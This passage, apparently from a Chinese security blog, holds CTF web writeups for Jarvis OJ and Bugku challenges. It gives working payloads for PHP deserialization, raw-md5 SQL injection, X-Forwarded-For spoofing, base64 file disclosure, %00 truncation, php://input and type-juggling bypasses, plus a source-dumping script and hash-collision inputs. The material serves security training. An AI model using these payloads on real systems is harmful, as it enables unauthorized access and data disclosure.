&amp;&amp; stripos($f,&#x27;/&#x27;)===FALSE &amp;&amp; stripos($f,&#x27;\\\\&#x27;)===FALSE &amp;&amp; stripos($f,&#x27;pctf&#x27;)===FALSE) &#123; readfile($f); &#125; else &#123; echo &quot;File not found!&quot;; &#125; &#125;?&gt; shield.php: 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = &#x27;&#x27;) &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#x27;..&#x27;)===FALSE &amp;&amp; stripos($this-&gt;file,&#x27;/&#x27;)===FALSE &amp;&amp; stripos($this-&gt;file,&#x27;\\\\&#x27;)==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 可以知道flag在pctf.php中，但过滤了pctf，不能直接包含pctf.php 构造反序列化序列： payload: index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125; 查看源码得到flag Login打开题目网址： 好像没什么思路啊，抓包看看吧 看到响应头中有个提示 &quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot; md5()函数有两个参数 参数一是要加密的字符串； 参数二是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。 看到提示第一时间想到注入,可是如何闭合sql语句呢？如果找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接成 类似 ‘or’xxx的形式就可以绕过了 将ffifdyop提交flag就出来了 PCTF&#123;R4w_md5_is_d4ng3rous&#125; LOCALHOST打开题目网址： 仅本机访问，立刻想到抓包改XFF flag就这样出来了，是不是很简单？就是这样简单 PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; PORT51打开题目网址可以发现： 它让我们用51端口访问这个网址 看其他大佬的wp用的是curl命令，打开虚拟机咱也试下吧 curl –local-port http://web.jarvisoj.com:32770/ 神魔情况？又看了看几位大佬的博客，说是必须要用公网IP的主机才行。不太死心，又试了试cmd里的，果然还是不行。 查看了众多大佬的博客后得出的原因好像是：本地私有地址从代理服务器出去后，使用的是代理服务器的端口，这个端口往往不会是51，我用的是校园网，虚拟机也是经过主机走的校园网，所以。。。。 没办法只能抄别人的flag了 PCTF&#123;M45t3r_oF_CuRl&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"jarvisoj","slug":"jarvisoj","permalink":"http://www.moonback.xyz/tags/jarvisoj/"}]},{"title":"bugku web部分题目writeup","slug":"bugku-web-partquestion","date":"2019-10-01T10:09:15.000Z","updated":"2019-10-17T05:53:28.980Z","comments":true,"path":"2019/10/01/bugku-web-partquestion/","link":"","permalink":"http://www.moonback.xyz/2019/10/01/bugku-web-partquestion/","excerpt":"本篇博客介绍了bugku中web部分题的writeup,感觉这些题自己收获还挺多的，包括以下题目： cookies欺骗 welcome to bugkuctf","text":"本篇博客介绍了bugku中web部分题的writeup,感觉这些题自己收获还挺多的，包括以下题目： cookies欺骗 welcome to bugkuctf cookies欺骗打开题目是这样的： http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= 会自动跳转到这个url,a2V5cy50eHQ=很想base64加密后的结果，解密一下发现解密结果为keys.txt，显然filename这个参数传的是文件名字base64加密后的结果，是否可以传输index.php加密的结果呢？ index.php经base64加密后为aW5kZXgucGhw，试着访问一下 http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw 发现内容为空白，查看源代码，发现有个 &lt;?php 将line=2发现 $file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;); 看来思路对了，line代表的就是行数，写个脚本看下吧 12345678import requestsurls&#x3D;[&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#123;&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot;.format(str(i))for i in range(100)]li&#x3D;&quot;&quot;for url in urls: r&#x3D;requests.get(url) if r.status_code&#x3D;&#x3D;200: li+&#x3D;(r.text)print(li) 因为不知道有多少行代码，先设成100吧，跑下，得到以下代码 1234567891011121314151617&lt;?phperror_reporting(0);$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);$file_list &#x3D; array(&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;$file_list[2]&#x3D;&#39;keys.php&#39;;&#125;if(in_array($file, $file_list))&#123;$fa &#x3D; file($file);echo $fa[$line];&#125;?&gt; 观察代码可知需要设置Cookie,还有个特殊文件keys.php,可能flag就在这个文件中，文件名base64加密后是a2V5cy5waHA= in_array()函数用于搜索数组中是否存在指定的值，抓包看下 payload:/web11/index.php?line=&amp;filename=a2V5cy5waHA= 设置Cookie: margin=margin 得到flag KEY&#123;key_keys&#125; never give up拿到题目是这样的 好像没什么思路，抓包看看吧 访问/test/hello.php会跳转到/test/hello.php?id=1，查看源代码发现有个1p.html，访问一下 发现，不抓包的话会跳转 12345678910&lt;!--var Words &#x3D;&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; function OutWord()&#123;var NewWords;NewWords &#x3D; unescape(Words);document.write(NewWords);&#125; OutWord();&#x2F;&#x2F; --&gt; Words中间好像有url编码，hackbar解码得到 12&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt; 又看到其中很像base64，解码得 1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E 好像还是url编码，再解密 12345678910111213141516171819202122232425&quot;;if(!$_GET[&#39;id&#39;])&#123; header(&#39;Location: hello.php?id&#x3D;1&#39;); exit();&#125;$id&#x3D;$_GET[&#39;id&#39;];$a&#x3D;$_GET[&#39;a&#39;];$b&#x3D;$_GET[&#39;b&#39;];if(stripos($a,&#39;.&#39;))&#123; echo &#39;no no no no no no no&#39;; return ;&#125;$data &#x3D; @file_get_contents($a,&#39;r&#39;);if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 看到有个f4l2a3g.txt，直接访问可以得到flag flag&#123;tHis_iS_THe_fLaG&#125; 除此之外，也可以绕过 payload:/test/hello.php?id=0easad&amp;b=%00adssadsa&amp;a=php://input post过去：bugku is a nice plateform! php会默认认为0e开头的弱等于0 eregi()函数用指定的模式搜索一个字符串中指定的字符串 int eregi(string pattern, string string, [array regs]); 存在%00截断漏洞，即%00后面的内容不解析 substr()函数用于返回字符串的一部分","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"bugku","slug":"bugku","permalink":"http://www.moonback.xyz/tags/bugku/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"}]},{"title":"bugku代码审计writeup","slug":"bugku-codecheck-wp","date":"2019-09-29T13:06:26.000Z","updated":"2019-10-17T05:57:26.991Z","comments":true,"path":"2019/09/29/bugku-codecheck-wp/","link":"","permalink":"http://www.moonback.xyz/2019/09/29/bugku-codecheck-wp/","excerpt":"本篇博客介绍了bugku上web代码审计部分的writeup!","text":"本篇博客介绍了bugku上web代码审计部分的writeup! extract变量覆盖题目给出的源码 12345678910111213141516&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET); if(isset($shiyan)) &#123; $content&#x3D;trim(file_get_contents($flag)); if($shiyan&#x3D;&#x3D;$content) &#123; echo&#39;flag&#123;xxx&#125;&#39;; &#125; else &#123; echo&#39;Oh.no&#39;; &#125; &#125;?&gt; 函数解释： extract()函数 用途：从数组中将变量导入到当前的符号表，返回值(int型)是成功导入到符号表中的变量数目 什么是符号表？ 符号表是指当前php页面中，所有变量名称的集合 isset()函数 用途：检测变量是否设置，并且不是 NULL 注意：$_GET传过来的参数的键值为string类型 file_get_contents()函数 用途：file_get_contents() 函数把整个文件读入一个字符串中如果失败，file_get_contents() 将返回 FALSE trim()函数 用途：移除字符串两侧的空白字符或其他预定义字符 解题思路： 首先要GET传一个参数shiyan 然后读取了$flag所代表文件的内容 payload: ?shiyan=&amp;flag=1 此时$shiyan=’’(空字符串),而不是NULL,flag只需传除存在的文件名以外任意值,空字符串弱等于FALSE,输出flag flag&#123;bugku-dmsj-p2sm3N&#125; strcmp比较字符串题目代码： 1234567891011&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123; if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0，如果两者相等，返回 0。 &#x2F;&#x2F;比较两个字符串（区分大小写） die(&#39;Flag: &#39;.$flag); else print &#39;No&#39;;&#125;?&gt; 分析代码可知需要传递个参数a 比较a和$flag的值，相同就会输出flag并结束 这里可以传入数组，strcmp()函数当比较数组和字符串的时候，返回是NULL即可绕过 payload：?a[]=1 flag&#123;bugku_dmsj_912k&#125; urldecode二次编码绕过题目代码： 12345678910111213141516171819202122&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot; not allowed! &quot;); exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123; echo &quot; Access granted! &quot;; echo &quot; flag &quot;;&#125;?&gt; 函数解释： eregi()函数 int eregi(string pattern, string string, [array regs]); eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写,如果没有找到匹配或出错则返回 FALSE 处理数组将返回NULL urldecode()函数 解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符 分析代码可知不能让eregi()函数成功匹配，要让$_GET[id] == &quot;hackerDJ&quot;成立 php在处理传递过来的参数是会进行一次url解码 可以二次编码进行绕过 payload:?id=hackerD%254A %25是%的url编码，%4A是J的url编码 这样经过php解析会得到 ?id=hackerD%4A 再次经过函数解析会得到 ?id=hackerDJ md5()函数题目代码： 12345678910111213&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123; if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) print &#39;Your password can not be your username.&#39;; else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else print &#39;Invalid password&#39;;&#125;?&gt; 函数解释： md5()函数 用途：以 32 字符十六进制数字形式返回散列值 **绕过方法:**md5()函数不能处理数组 payload:?password[]=1&amp;username[]=2 md5()函数在处理数组时会返回NULL md5碰撞 两个MD5值相同的不同字符串 Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 和 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 `flag&#123;bugk1u-ad8-3dsa-2&#125;` 数组返回NULL绕过题目代码： 123456789101112&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;You password must be alphanumeric&#39;;else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39; . $flag);elseecho &#39;Invalid password&#39;;&#125;?&gt; 函数解释： strpos()函数 用于查找字符串首次出现的位置 int strpos( string $haystack, mixed $needle[, int $offset = 0] ) 如果没找到 needle，将返回 FALSE 当$haystack为数组时，函数返回NULL,当$needle为数组时函数返回FALSE payload:?password[]=1 ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])和strpos ($_GET[&#39;password&#39;], &#39;--&#39;)的返回结果都是NULL,不强等于FALSE flag&#123;ctf-bugku-ad-2131212&#125; 弱类型整数大小比较绕过题目代码： 1234$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; 分析题目可知GET传参password，且不能为纯数字 payload1:?password=2000a 字符串进行数学运算时，会自动转换为数字后再进行运算 payload2:?password[]=1 is_numeric()函数处理数组时会返回FALSE 数组大于任一数字 flag&#123;bugku_null_numeric&#125; sha()函数比较绕过题目代码： 1234567891011121314151617181920212223242526272829&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;var_dump($_GET[&#39;name&#39;]);echo &quot;&quot;;var_dump($_GET[&#39;password&#39;]);var_dump(sha1($_GET[&#39;name&#39;]));var_dump(sha1($_GET[&#39;password&#39;]));if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])echo &#39;Your password can not be your name!&#39;;else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseecho &#39;Invalid password.&#39;;&#125;elseecho &#39;Login first!&#39;;?&gt; 传两个参数，name和password 并且这两个参数要经过sha1()加密还要相等才能输出flag 这里便想到了传入数组将返回NULL payload1:?name[]=1&amp;password[]=2 sha1()碰撞 payload2:?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 好像直接显示不出来，需要查看源代码或者抓包 flag&#123;bugku--daimasj-a2&#125; md5加密相等绕过题目代码： 123456789101112&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123;if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123;echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt; 看到QNKCDZO立马想到了md5弱比较 即php会把每一个以”0E”开头的哈希值都解释为0 payload:?a=s878926199a 其中QNKCDZO和s878926199a md5加密后都是0e开头 flag&#123;bugku-dmsj-am9ls&#125; 十六进制与数字比较题目代码： 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag &#x3D; &#39;flag&#123;test&#125;&#39;;$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$number &#x3D; &#39;3735929054&#39;;&#x2F;&#x2F; Check all the input characters!for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;&#x2F;&#x2F; Disallow all the digits!$digit &#x3D; ord($temp&#123;$i&#125;);if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number &#x3D;&#x3D; $temp)return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; 输出flag的条件$temp要弱等于$number = ‘3735929054’，$temp为传入参数password的值，并且遍历$temp的每个字符还不能在1—-9之间 看着题目名称便想到了转换16进制 payload:?password=0xdeadc0de 0xdeadc0de为3735929054十六进制形式 flag&#123;Bugku-admin-ctfdaimash&#125; 变量覆盖ereg正则%00截断题目代码： 1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset ($_GET[&#39;password&#39;]))&#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) &#123; echo &#39; You password must be alphanumeric &#39;; &#125; else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) &#123; if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置 &#123; die(&#39;Flag: &#39; . $flag); &#125; else &#123; echo(&#39; - have not been found &#39;); &#125; &#125; else &#123; echo &#39; Invalid password &#39;; &#125;&#125;?&gt; ereg函数存在00截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析 payload: ?password=1e9%00*-* 1e9是科学计数法，代表1x10^9 利用ereg()函数00截断漏洞，绕过匹配 *-*，应该是题目出错了，不过提示里有 另外也可以直接传数组 payload: ?password[]=1 flag&#123;bugku-dm-sj-a12JH8&#125; strpos数组绕过题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;&#125;?&gt;ereg()函数传入数组会返回NULL,不强等于FALSE,进入else ifstrpos()函数传入数组会返回NULL,不强不等于FALSE,条件成立payload:?ctf[]&#x3D;flag&#123;Bugku-D-M-S-J572&#125;数字验证正则绕过题目代码：&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])&#123;$password &#x3D; $_POST[&#39;password&#39;];if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match — 执行一个正则表达式匹配&#123;echo &#39;flag&#39;;exit;&#125;while (TRUE)&#123;$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;if (6 &gt; preg_match_all($reg, $password, $arr))break;$c &#x3D; 0;$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))$c +&#x3D; 1;&#125;if ($c &lt; 3) break;&#x2F;&#x2F;&gt;&#x3D;3，必须包含四种类型三种与三种以上if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;else echo &#39;Wrong password&#39;;exit;&#125;&#125;?&gt; $_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建 这里的$_SERVER[‘REQUEST_METHOD’]指的是请求提交数据的方式 可以看到需要POST一个参数为password的变量 下面是代码中的一些正则表达式语法 [:alpha:] 匹配当前归类中的大写和小写字母字符。例如，&#39;[0-9]&#123;3&#125;[[:alpha:]]&#123;2&#125;&#39; 匹配三个数字，后跟两个字母。 [:alnum:] 匹配当前归类中的数字、大写和小写字母字符。例如，&#39;[[:alnum:]]+&#39; 匹配含有一个或多个字母和数字的字符串。 [:digit:] 匹配当前归类中的数字。例如，&#39;[[:digit:]-]+&#39; 匹配含有一个或多个数字或横线的字符串。同样，&#39;[^[:digit:]-]+&#39; 匹配含有一个或多个不是数字或横线的字符的字符串。 [:lower:] 匹配当前归类中的小写字母字符。例如，&#39;[[:lower:]]&#39; 不匹配 A，因为 A 为大写。 [:space:] 匹配单个空格 (&#39; &#39;） [:upper:] 匹配当前归类中的大写字母字符。例如，&#39;[[:upper:]ab]&#39; 与以下其中一项匹配：任何大写字母、a 或 b。 [:whitespace:] 匹配一个空白字符，例如，空格、制表符、换页符和回车符。 [:ascii:] 匹配任何七位的 ASCII 字符（0 到 127 之间的顺序值）。 [:blank:] 匹配一个空白区或水平制表符。 [[:blank:]] 等效于 [ \\t]。 [:cntrl:] 匹配顺序值小于 32 或字符值为 127 的 ASCII 字符（控制字符）。控制字符包括换行符、换页符、退格符，等等。 [:graph:] 匹配打印字符。 [[:graph:]] 等效于 [[:alnum:][:punct:]]。 [:print:] 匹配打印字符和空格。 [[:print:]] 等效于 [[:graph:][:whitespace:]]。 [:punct:] 匹配其中一个字符： !&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~. [:punct:] 子字符类不能包括当前归类中可用的非 ASCII 标点字符。 [:word:] 匹配当前归类中的字母、数字或下划线字符。 [[:word:]] 等效于 [[:alnum:]_]。 [:xdigit:] 匹配字符类 [0-9A-Fa-f] 中的字符。 preg_match() 函数返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索 int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 